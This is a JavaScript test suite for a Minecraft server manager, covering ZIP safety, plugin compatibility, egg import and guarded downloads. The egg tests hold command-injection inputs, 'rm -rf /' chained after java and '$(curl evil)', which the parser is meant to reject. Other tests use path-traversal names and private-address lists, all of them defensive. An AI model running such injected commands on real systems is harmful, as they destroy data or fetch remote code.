'use strict';
const test = require('node:test'), assert = require('node:assert/strict');
const fs = require('fs'), path = require('path'), crypto = require('crypto');
const { tmp, serve } = require('./helpers');
const { openZip, buildZip, isSafeEntryName } = require('../lib/zip');
const net = require('../lib/net');
const { describeJar, evaluateCompat, parseSimpleYaml } = require('../lib/jarinfo');
const { detectSoftware } = require('../lib/detect');
const { parseEgg, expandStartup } = require('../lib/eggs');
const { validateSoftwareDef, inspectServerJar } = require('../lib/custom-software');
const { compareVersions, javaMajorFallback } = require('../lib/catalog');
const env = require('../lib/environment');

const mkJar = (files) => buildZip(files);
const mf = main => `Manifest-Version: 1.0\nMain-Class: ${main}\n`;

test('zip: reads deflated and stored entries, rejects corruption and unsafe names', async () => {
  const z = await openZip(buildZip([{ name: 'a.txt', data: 'hello' }, { name: 'b.txt', data: 'stored', store: true }]));
  assert.equal((await z.read('a.txt')).toString(), 'hello'); assert.equal((await z.read('b.txt')).toString(), 'stored');
  await assert.rejects(openZip(Buffer.from('not a zip at all, definitely not')), /Not a ZIP/);
  const bad = buildZip([{ name: 'a.txt', data: 'hello', store: true }]); const at = bad.indexOf('hello'); assert.ok(at > 0); bad[at] ^= 1;
  const zb = await openZip(Buffer.from(bad)); await assert.rejects(zb.read('a.txt'), /checksum|decompressed/);
  for (const n of ['../x', '/etc/passwd', 'a\\b', 'C:/x', 'a/../../b']) assert.equal(isSafeEntryName(n), false, n);
  assert.equal(isSafeEntryName('assets/logo.png'), true);
});
test('zip: size limit protects against bombs', async () => {
  const z = await openZip(buildZip([{ name: 'big.txt', data: Buffer.alloc(200000, 'a') }]));
  await assert.rejects(z.read('big.txt', { maxSize: 1000 }), /limit/);
});

test('yaml subset parser', () => {
  const y = parseSimpleYaml("name: 'My Plugin' # c\nversion: 1.2\napi-version: \"1.21\"\nauthors: [A, B]\ndepend:\n  - Vault\n  - 'Foo'\ncommands:\n  x:\n    description: y\n");
  assert.deepEqual([y.name, y.version, y['api-version'], y.authors, y.depend], ['My Plugin', '1.2', '1.21', ['A', 'B'], ['Vault', 'Foo']]);
  assert.equal(y.commands, undefined);
});

test('jar descriptors and compatibility', async () => {
  const d = tmp();
  const write = (n, files) => { const f = path.join(d, n); fs.writeFileSync(f, mkJar(files)); return f; };
  const bukkit = await describeJar(write('b.jar', [{ name: 'plugin.yml', data: 'name: Essentials\nversion: 2.0\nmain: a.B\napi-version: 1.21\n' }]));
  assert.equal(bukkit.kind, 'bukkit'); assert.equal(bukkit.name, 'Essentials');
  const paper = { id: 'paper', name: 'Paper', pluginLoaders: ['paper', 'spigot', 'bukkit'] };
  assert.equal(evaluateCompat(bukkit, paper, '1.21.11').status, 'compatible');
  assert.equal(evaluateCompat({ ...bukkit, apiVersion: '1.22' }, paper, '1.21.11').status, 'incompatible');
  assert.equal(evaluateCompat({ ...bukkit, apiVersion: null }, paper, '1.21.11').status, 'warning');
  assert.equal(evaluateCompat(bukkit, { id: 'folia', name: 'Folia', pluginLoaders: ['folia'] }, '1.21.11').status, 'incompatible');
  assert.equal(evaluateCompat({ ...bukkit, foliaSupported: true }, { id: 'folia', name: 'Folia', pluginLoaders: ['folia'] }, '1.21.11').status, 'compatible');
  const vel = await describeJar(write('v.jar', [{ name: 'velocity-plugin.json', data: JSON.stringify({ id: 'x', name: 'X', version: '1', authors: ['a'] }) }]));
  assert.equal(vel.kind, 'velocity');
  assert.equal(evaluateCompat(vel, paper, '1.21.11').status, 'incompatible');
  assert.equal(evaluateCompat(vel, { id: 'velocity', name: 'Velocity', pluginLoaders: ['velocity'] }, null).status, 'compatible');
  assert.equal(evaluateCompat(bukkit, { id: 'velocity', name: 'Velocity', pluginLoaders: ['velocity'] }, null).status, 'incompatible');
  const mod = await describeJar(write('m.jar', [{ name: 'fabric.mod.json', data: '{"id":"m","version":"1"}' }]));
  assert.match(evaluateCompat(mod, paper, '1.21.11').notes[0], /mod, not a server plugin/);
  assert.equal(evaluateCompat(bukkit, { id: 'fabric', name: 'Fabric', pluginLoaders: [] }, '1.21.11').status, 'incompatible');
  assert.equal(evaluateCompat(await describeJar(write('u.jar', [{ name: 'x.txt', data: 'x' }])), paper, '1.21').status, 'unknown');
  assert.equal((await describeJar(path.join(d, 'nonexistent.jar'))).valid, false);
  fs.writeFileSync(path.join(d, 'junk.jar'), 'junk junk junk junk junk junk'); assert.equal((await describeJar(path.join(d, 'junk.jar'))).valid, false);
});

test('software detection from files and manifests', async () => {
  const d = tmp();
  fs.writeFileSync(path.join(d, 'velocity.toml'), ''); assert.equal((await detectSoftware({ dir: d })).id, 'velocity');
  const e = tmp(); fs.writeFileSync(path.join(e, 'server.jar'), mkJar([{ name: 'META-INF/MANIFEST.MF', data: mf('io.papermc.paperclip.Main') }, { name: 'version.json', data: '{"name":"1.21.11"}' }]));
  const r = await detectSoftware({ dir: e, jarName: 'server.jar' }); assert.equal(r.id, 'paper'); assert.equal(r.version, '1.21.11');
  const f = tmp(); fs.writeFileSync(path.join(f, 'server.jar'), mkJar([{ name: 'META-INF/MANIFEST.MF', data: mf('net.minecraft.bundler.Main') }]));
  assert.equal((await detectSoftware({ dir: f })).id, 'vanilla');
  assert.equal(await detectSoftware({ dir: tmp() }), null);
});

test('custom software validation and jar inspection', async () => {
  assert.ok(validateSoftwareDef({ id: 'my-fork', name: 'My Fork', kind: 'server', supportsPlugins: true, pluginLoaders: ['paper'], versions: [{ version: '1.0', url: 'https://example.com/a.jar', sha256: 'a'.repeat(64) }] }).value);
  for (const bad of [{ id: 'X', name: 'a', kind: 'server' }, { id: 'ok-id', name: 'a', kind: 'weird' }, { id: 'ok-id', name: 'a', kind: 'server', versions: [{ version: '1', url: 'http://x/a.jar' }] }, { id: 'ok-id', name: 'a', kind: 'server', supportsPlugins: true }, { id: 'ok-id', name: 'a', kind: 'server', jar: '../x.jar' }, { id: 'ok-id', name: 'a', kind: 'server', versions: [{ version: '1', url: 'https://u:p@x/a.jar' }] }])
    assert.equal(validateSoftwareDef(bad).value, null, JSON.stringify(bad));
  const d = tmp(), good = path.join(d, 'g.jar'), nomain = path.join(d, 'n.jar');
  fs.writeFileSync(good, mkJar([{ name: 'META-INF/MANIFEST.MF', data: mf('a.Main') }])); fs.writeFileSync(nomain, mkJar([{ name: 'META-INF/MANIFEST.MF', data: 'Manifest-Version: 1.0\n' }]));
  assert.equal((await inspectServerJar(good)).mainClass, 'a.Main');
  await assert.rejects(inspectServerJar(nomain), /Main-Class/); await assert.rejects(inspectServerJar(path.join(d, 'x')), /not a valid JAR|ENOENT/);
});

test('eggs: converts java startup, refuses shell tricks and non-java', () => {
  const egg = { meta: { version: 'PTDL_v2' }, name: 'Paper', author: 'a@b.c', startup: 'java -Xms128M -Xmx{{SERVER_MEMORY}}M -jar {{SERVER_JARFILE}} nogui --world "{{WORLD}}"', variables: [{ name: 'World', env_variable: 'WORLD', default_value: 'my world', user_editable: true }], config: { stop: 'stop' }, scripts: { installation: { script: '#!/bin/bash\ncurl -o s.jar https://example.com/x.jar' } }, docker_images: { Java21: 'x' } };
  const r = parseEgg(egg); assert.ok(r.ok && r.importable);
  const args = expandStartup(r.profile.startupTemplate.args, { memoryMB: 2048, jar: 'server.jar', vars: { WORLD: 'my world' } });
  assert.deepEqual(args, ['-Xms128M', '-Xmx2048M', '-jar', 'server.jar', 'nogui', '--world', 'my world']);
  assert.match(r.report.unsupported.join(' '), /installation script/); assert.deepEqual(r.profile.egg.installUrls, ['https://example.com/x.jar']);
  assert.equal(parseEgg({ ...egg, startup: 'java -jar x.jar; rm -rf /' }).importable, false);
  assert.equal(parseEgg({ ...egg, startup: 'java -jar $(curl evil)' }).importable, false);
  assert.equal(parseEgg({ ...egg, startup: './bedrock_server' }).importable, false);
  assert.equal(parseEgg({ ...egg, startup: 'java -jar {{UNKNOWN}}' }).importable, false);
  assert.equal(parseEgg({ foo: 1 }).ok, false); assert.equal(parseEgg({ ...egg, meta: { version: 'PTDL_v9' } }).ok, false);
  assert.match(parseEgg({ ...egg, config: { stop: '^C' } }).report.warnings.join(' '), /signal/);
});

test('versions and java fallback', () => {
  assert.ok(compareVersions('1.21.11', '1.21.9') > 0); assert.ok(compareVersions('1.21', '1.21.1') < 0); assert.ok(compareVersions('1.8', '1.21') < 0);
  assert.equal(javaMajorFallback('1.21.11'), 21); assert.equal(javaMajorFallback('1.20.4'), 17); assert.equal(javaMajorFallback('1.20.5'), 21); assert.equal(javaMajorFallback('1.16.5'), 8); assert.equal(javaMajorFallback('26.1'), null);
});

test('environment helpers', async () => {
  assert.equal(env.parseJavaMajor('openjdk version "21.0.5" 2024'), 21); assert.equal(env.parseJavaMajor('java version "1.8.0_392"'), 8); assert.equal(env.parseJavaMajor('nothing'), null);
  assert.equal(env.parseOsRelease('NAME="Ubuntu"\nVERSION_ID="24.04"\nPRETTY_NAME="Ubuntu 24.04 LTS"\nID=ubuntu\n').pretty, 'Ubuntu 24.04 LTS');
  assert.equal(env.suggestMemoryGB(16 * 2 ** 30, 0), 5); assert.equal(env.suggestMemoryGB(2 * 2 ** 30, 3), 1);
  const fake = (cmd, args, o, cb) => cmd === 'java' ? cb(new Error('x'), '', 'openjdk version "17.0.9"') : cb(new Error('ENOENT'), '', '');
  assert.equal((await env.detectJava('java', fake)).major, 17);
  const none = (c, a, o, cb) => cb(Object.assign(new Error('x'), { code: 'ENOENT' }), '', ''); assert.equal((await env.detectJava('java', none)).found, false);
  const rep = await env.inspectEnvironment({ root: tmp(), execImpl: none, requiredJava: 21 });
  assert.equal(rep.overall, 'fail'); assert.ok(rep.checks.find(c => c.id === 'java').fix);
  assert.ok(await env.nextFreePort(40000));
});

test('net: download verifies checksums, size and truncation; blocks hosts and redirects', async () => {
  const body = crypto.randomBytes(5000), sha = crypto.createHash('sha256').update(body).digest('hex');
  const srv = await serve({ '/ok': (q, r) => { r.setHeader('content-length', body.length); r.end(body); }, '/redir': (q, r) => { r.statusCode = 302; r.setHeader('location', '/ok'); r.end(); },
    '/trunc': (q, r) => { r.setHeader('content-length', 9999); r.write(body.subarray(0, 100)); r.destroy(); }, '/json': (q, r) => r.end('{"a":1}'), '/html': (q, r) => r.end('<html>') });
  const o = { guard: false, allowHttp: true }, d = tmp();
  try {
    let r = await net.downloadToFile(srv.url + '/redir', path.join(d, 'a'), { ...o, expected: { algorithm: 'sha256', value: sha } }); assert.equal(r.verified, 'sha256'); assert.equal(r.bytes, 5000);
    await assert.rejects(net.downloadToFile(srv.url + '/ok', path.join(d, 'b'), { ...o, expected: { algorithm: 'sha256', value: '0'.repeat(64) } }), /Checksum mismatch/); assert.equal(fs.existsSync(path.join(d, 'b')), false);
    await assert.rejects(net.downloadToFile(srv.url + '/ok', path.join(d, 'c'), { ...o, maxBytes: 100 }), /larger/); assert.equal(fs.existsSync(path.join(d, 'c')), false);
    await assert.rejects(net.downloadToFile(srv.url + '/trunc', path.join(d, 'e'), o)); assert.equal(fs.existsSync(path.join(d, 'e')), false);
    await assert.rejects(net.downloadToFile(srv.url + '/ok', path.join(d, 'f'), { ...o, allowHosts: ['example.com'] }), /not permitted/);
    await assert.rejects(net.downloadToFile(srv.url + '/ok', path.join(d, 'g'), { guard: false }), /Only HTTPS/);
    await assert.rejects(net.getJson(srv.url + '/html', o), /not valid JSON/); assert.deepEqual(await net.getJson(srv.url + '/json', o), { a: 1 });
    await assert.rejects(net.openStream('https://user:pw@example.com/x'), /credentials/);
  } finally { await srv.close(); }
});
test('net: private addresses are refused at connect time', async () => {
  for (const ip of ['127.0.0.1', '10.1.2.3', '192.168.1.5', '169.254.169.254', '172.16.0.1', '::1', 'fd00::1', '::ffff:10.0.0.1']) assert.equal(net.isPublicAddress(ip), false, ip);
  for (const ip of ['8.8.8.8', '1.1.1.1', '2606:4700::1111']) assert.equal(net.isPublicAddress(ip), true, ip);
  await assert.rejects(net.openStream('https://localhost:1/x', { timeoutMs: 3000 }), /private|non-public/);
});
